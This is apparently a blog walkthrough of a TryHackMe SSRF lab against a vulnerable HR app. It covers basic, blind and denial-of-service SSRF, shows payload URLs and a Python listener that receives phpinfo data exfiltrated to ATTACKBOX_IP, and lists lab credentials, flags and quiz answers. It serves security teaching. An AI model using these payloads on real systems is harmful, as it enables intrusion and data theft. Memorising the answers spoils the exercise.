---
title: "SSRF"
date: 2024-11-28 12:00:00 +0000
categories: [Walkthrough, Tryhackme]
tags: [Walkthrough, Cybersecurity, Tryhackme]
pin: false
---

**Discover the inner workings of SSRF and explore multiple exploitation techniques.**


# **introduction** 

The landscape of web attacks constantly evolves, with threat actors devising sophisticated methods to compromise systems. As each day passes, the expansion of web-based threats warrants the need for robust cyber security measures to counter the ever-advancing tactics employed by malicious actors. In this room, we will discuss a similar attack known as Server Side Request Forgery (SSRF).

**SSRF** is a **web application security vulnerability** that allows the attacker to **force the server** to make **unauthorised requests** to any **local or external** source on behalf of the web server. **SSRF** allows an attacker to interact with **internal systems**, potentially leading to **data leaks**, **service disruption**, or even **remote code execution** **(RCE)**.

*We will use a vulnerable Human Resource Management System (HRMS) web app throughout the room to understand various SSRF techniques.*

this is the Target ipaddress **10.10.130.34**


# **Anatomy of SSRF Attack**

An `SSRF` vulnerability can arise when user-provided data is used to construct a request, such as forming a `URL`.

To execute an `SSRF` attack, an attacker can manipulate a parameter value within the vulnerable software, effectively creating or controlling requests from that software and directing them towards other servers or even the same server.

Most `SSRF` vulnerabilities are commonly discovered in **web applications** and other **networked software**.

**OWASP Ranking:**

SSRF is a formidable security threat, earning a spot in OWASP's top 10 list.

As per OWASP, factors regarding SSRF are mentioned below:

![Screnshot](/assets/img/SSRF/1.png)

**Note**: The SSRF vulnerability ranks 7th in the OWASP API Security Top 10.

# Risk of SSRF

**Data Exposure**

As explained earlier, cybercriminals can gain unauthorised access by tampering with requests on behalf of the vulnerable web application to gain access to sensitive data hosted in the internal network.

**Reconnaissance**

An attacker can carry out port scanning of internal networks by running malicious scripts on vulnerable servers or redirecting to scripts hosted on some external server.

**Denial of Service**

It is a common scenario that internal networks or servers do not expect many requests; therefore, they are configured to handle low bandwidth. Attackers can flood the servers with multiple illegitimate requests, causing them to remain unavailable to handle genuine requests.

**What is the average weighted impact for the SSRF vulnerability as per the OWASP Top 10?**

Ans: **`6.72`** 


# **Types of SSRF - Basic**

`Basic SSRF` is a web attack technique where an attacker tricks a server into making requests on their behalf, often targeting internal systems or third-party services. By exploiting vulnerabilities in input validation, the attacker can gain unauthorised access to sensitive information or control over remote resources, posing a significant security risk to the targeted application and its underlying infrastructure.
A basic SSRF can be employed against a local or an internal server.

**Scenario - I: SSRF Against a Local Server**

In this attack, the attacker makes an unauthorised request to the server hosting the web application. The attacker typically supplies a loopback IP address or localhost to receive the response. The vulnerability arises due to how the application handles input from the query parameter or API calls. 

For example, in the HRMS application, there's a feature that loads additional pages based on a URL parameter. For example, navigating to `http://hrms.thm?url=localhost/copyright` would load the copyright page of the application.

![Screnshot](/assets/img/SSRF/2.png)

an `attacker` can manipulate this functionality for `SSRF` attacks. By changing the URL parameter to point to other `pages/services`, the attacker can force the `HRMS` server to make requests to other pages.
For instance, if the attacker uses a URL like `http://hrms.thm/?url=localhost/config`, and config is a valid page, the HRMS server will attempt to fetch content from this page and display the result. 

![Screnshot](/assets/img/SSRF/3.png)

As we can see there is the config file data..

```c
<?php
$adminURL = "http://192.168.2.10/admin.php";
$username = "hrmsadmin";
$password = "hrmsadmin@123";
```


The main idea is to forge a legitimate request and make the server perform an unintended action.

**The webpage shows the copyright status of the website.**

This means the developer has probably made some mistakes while handling a file showing the copyright status. Here is the code of the page that takes the query parameter.

```php
$uri = rtrim($_GET['url'], "/");
...					
$path = ROOTPATH . $file;
...
if (file_exists($path)) {
  echo "<pre>";
  echo htmlspecialchars(file_get_contents($path));
  echo "</pre>";
  } else { ?>
    <p class="text-xl"><?= ltrim($file, "/") ?> is not found</p>
 <?php
... 
```

We can see in the above code that the input parameter url lacks adequate filtering and loads whatever the parameter is provided from the localhost.

Let's try to change the URL from `http://hrms.thm/?url=localhost/copyright` to `http://hrms.thm/?url=localhost/hello;` it displays an error that `hello.php is not found`.

![Screenshot](/assets/img/SSRF/4.png)

*The Most Important thing in this task that we learned how to change the url to an important file names and look at the results, we've got the config file data by just adding a simple file name in the url, so put in mind to check everytime about the sensitive file names in url.*


**What is the username for the HRMS login panel?**

*hrmsadmin*

**What is the password for the HRMS login panel?**

*hrmsadmin@123*

**What is the admin URL as per the config file?**

`http://192.168.2.10/admin.php`

**What is the flag value after successfully logging in to the HRMS web panel?**

![Screenshot](/assets/img/SSRF/5.png)

There is the Flag : Flag: `THM_{1NiT_S$rF}`

![Screenshot](/assets/img/SSRF/6.png)


# **Types of SSRF - Basic (Continued)**

Scenario - II: **Accessing an Internal Server**

In complex web applications, it is common for front-end web applications to interact with back-end internal servers. These servers are generally hosted on `non-routable IP addresses`, it's just will be accessible in the internal server bu the pc user but if someone on the internet wanna access it, he can't.

In this scenario, an attacker exploits a vulnerable web application's input validation to trick the server into requesting internal resources on the same network. They could provide a malicious URL as input, making the server interact with the internal server on their behalf.


**How it works**

In this case, we will try to access the inaccessible internal resources through direct request.

Now that we have acquired the credentials for the login panel, we will log in to the dashboard.

Once we log in to the HRMS web app, we will see a dashboard listing employees and their departments. There is a dropdown that shows employees' data and salary.

![Screenshot](/assets/img/SSRF/7.png)

From the `config file`, we can see that the admin panel is hosted at `http://192.168.2.10/admin.php`. If we try to log in to the admin panel, **it is not accessible directly**. Let's try to access it;
it will show an error.

![Screenshot](/assets/img/SSRF/8.png)

We have no route to that IP as it's a private network IP and can only be accessed by a machine within the same network.
If we check the source of the HTML, it shows that the dropdown takes the URL from an internal system and renders the data. The details of all employees are being rendered from `http://192.168.2.10/employees.php`.

![Screenshot](/assets/img/SSRF/9.png)

That's great, so the dropdown is accessing an internal system; what if we try to change the request such that instead of loading the employee page, we forge the request and send `http://192.168.2.10/admin.php` as a parameter to the server?

Let's do that. Use the Inspect Element option and change the drop down value of salary from `http://192.168.2.10/salary.php` to `http://192.168.2.10/admin.php` as shown below:


![Screenshot](/assets/img/SSRF/10.png)

Here we go; we got access to the admin panel that was earlier inaccessible from the same IP.


![Screenshot](/assets/img/SSRF/11.png)


**Is accessing non-routable addresses possible if a server is vulnerable to SSRF (yea/nay)?**

*yea*

**What is the flag value after accessing the admin panel?**

*THM_{B@$ic_s$rF}*


# **Types of SSRF - Blind**

`Blind SSRF` refers to a scenario where the attacker can send requests to a target server, but they do not receive direct responses or feedback about the outcome of their requests. In other words, the attacker is blind to the server's responses. This type of SSRF can be more challenging to exploit because the attacker cannot directly see the results of their actions. 

**Blind SSRF With Out-Of-Band**

Out-of-band SSRF is a technique where the attacker leverages a separate, out-of-band communication channel instead of directly receiving responses from the target server to receive information or control the exploited server. This approach is practical when the server's responses are not directly accessible to the attacker.

An attacker can exploit an SSRF vulnerability by forcing the server to interact with an external resource they control. This can confirm the vulnerability and reveal sensitive information, like internal IP addresses or the network's structure.

**How it works**

Once again, log in to the dashboard and click on the Profile tab in the navigation bar. We will see that it redirects to `http://hrms.thm/profile.php?url=localhost/getInfo.php`, which displays a message that data is being sent.

![Screenshot](/assets/img/SSRF/12.png)

What is happening here? Once we load profile.php, it sends data to an external page named getInfo.php, which is probably used for analytics or logs.

```php
<?php
...
$targetUrl = $_GET['url'];
ob_start();
ob_start();
phpinfo();
$phpInfoData = ob_get_clean();
$ch = curl_init($targetUrl); 
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch); 
...
?>
```

Source code analysis of the page shows that it is reading url parameters, and without performing any validation, it sends the information to the server mentioned in the url parameter. 

Here, an attacker can redirect the request to their server, thus getting additional information for exploitation or data pilferage. 

On our AttackBox, we will create a new file called server.py and add the following code to it:

```bash
nano server.py
```

then we will pase this code:

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
    
```

The above code will receive all the content and save it to a file data.
html on the server.
To obtain the data, we first need to start a lightweight server.
We can do this in AttackBox by using the following commands:

```bash
thm@machine$ sudo chmod +x server.py && sudo python3 server.py
```

Now we will open the browser and open `http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080`, which will log the data in the data.html.

Open the data.html file, which contains all the essential information related to the server that can be used to launch further attacks.

![Screenshot](/assets/img/SSRF/13.png)

So After opening `http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080` 


![Screenshot](/assets/img/SSRF/14.png)

the first ip is the target ipaddress while te second ip is our attack the box machine address which is the ipaddress which will recieve the data.

now let's open the data.html file what we got from the server.

![Screenshot](/assets/img/SSRF/15.png)

let's open it from the Graphical Desktop ..

![Screenshot](/assets/img/SSRF/16.png)

# Semi-Blind SSRF (Time-based)

Time-based SSRF is a variation of SSRF where the attacker leverages timing-related clues or delays to infer the success or failure of their malicious requests. **By observing how long it takes for the application to respond**, the attacker can make educated guesses about whether their SSRF attack was successful. 

The attacker sends a series of requests, each targeting a different resource or URL. The attacker measures the response times for each request. If a response takes significantly longer, it may indicate that the server successfully accessed the targeted resource, implying a successful SSRF attack.


**Does Out-of-band SSRF always include a technique in which an attacker always receives direct responses from the server (yea/nay)?**

*nay*

**What is the value for Virtual Directory Support on the PHP server per the logged data?**

![Screenshot](/assets/img/SSRF/17.png)

*disabled*

**What is the value of the PHP Extension Build on the server?**

*API20190902,NTS*

**Which type of SSRF doesn't give us a direct response or feedback?**

*blind*


# A Classic Example - Crashing the Server

An attacker could abuse `SSRF` by crashing the server or creating a denial of service for other hosts. There are multiple instances (WordPress, CairoSVG) where attackers try to disrupt the availability of a system by launching `SSRF` attacks. 

**Crashing the Server**

the vulnerability is exploited by supplying a malicious URL that points to a resource which, when accessed by the server, leads to excessive resource consumption or triggers a crash.

*For example*, the attacker might input a URL pointing to a large file on a slow server or a service that responds with an overwhelming amount of data. When the vulnerable application naively accesses this URL, it engages in an action that exhausts its own system resources, leading to a slowdown or complete crash.

**How it works**

Once we log in to the `dashboard`, we will see a tab called `Training` in the navigation bar, which is used to load the training content for the employees.
Once we click on that tab, we will see that it redirects to the URL `http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg`, which shows training content.

![Screenshot](/assets/img/SSRF/18.png)


We notice that the `url.php` file is loading external content

`http://10.10.231.163/url.php?id=192.168.2.10/trainingbanner.jpg`

What if we try to load any other content?

let's try to access tryhackme check vpn connection page for example `10.10.10.10`

`http://10.10.231.163/url.php?id=10.10.10.10/trainingbanner.jpg`

![Screenshot](/assets/img/SSRF/19.png)

Now that we know the server is vulnerable to basic SSRF, let's explore the code of `url.php` to make it crash the server.
Once we access the URL `http://hrms.thm/?url=localhost/url`, we will see the following code at the footer (only works if the user is not logged in).

```php
<?php
....
....
    if ($imageSize < 100) {
		  // Output the image if it's within the size limit
    
		$base64Image = downloadAndEncodeImage($imageUrl);
        echo '<img src="' . htmlspecialchars($base64Image) . '" alt="Image" style="width: 100%; height: 100%; object-fit: cover;">';

    } else {
	 	// Memory Outage - server will crash
    
....
...
```

The above code shows that the url.php loads an image; if the image size exceeds `100KB`, it shows a memory outage message and throws an error.

Let's try to crash the server by loading an image greater than `100 KB`. For your convenience, we already have such an image available, which you can forge via `http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg`.

![Screenshot](/assets/img/SSRF/20.png)

`SSRF` vulnerabilities not only risk unauthorized data access and internal network exposure but also threaten critical server operations by enabling attackers to overload systems, potentially causing crashes and denial of service.

**What is the flag value after loading a big image exceeding 100KB?**

Flag: *THM_{$$rF_Cr@$h3D}*


# **Remedial Measures**

SSRF mitigation is crucial for securing web applications and safeguarding user data. Key strategies include:  

- **Input Validation:** Strictly validate and sanitize all user inputs, particularly URLs or parameters used for external requests.  
- **Allowlisting:** Permit requests only to predefined, trusted URLs or domains, avoiding risky blocklisting.  
- **Network Segmentation:** Isolate sensitive internal resources to prevent unauthorized external access.  
- **Security Headers:** Use headers like Content-Security-Policy to control the loading of external resources.  
- **Access Controls:** Enforce strong access restrictions for internal resources to prevent unauthorized data access.  
- **Logging and Monitoring:** Track incoming requests, detect anomalies, and set alerts for suspicious activities.  

These measures strengthen defenses, prevent malicious requests, and maintain overall security and trust.

**Which of the following is the suggested approach while handling trusted URLs? Write the correct option only.**

a- Filter out disallowed URLs

b- Maintaining an allowlist of trusted URLs

Ans: *b*

**Since SSRF mainly exploits server-side requests, is it optional to sanitise the input URLs or parameters (yea/nay)?**

*nay*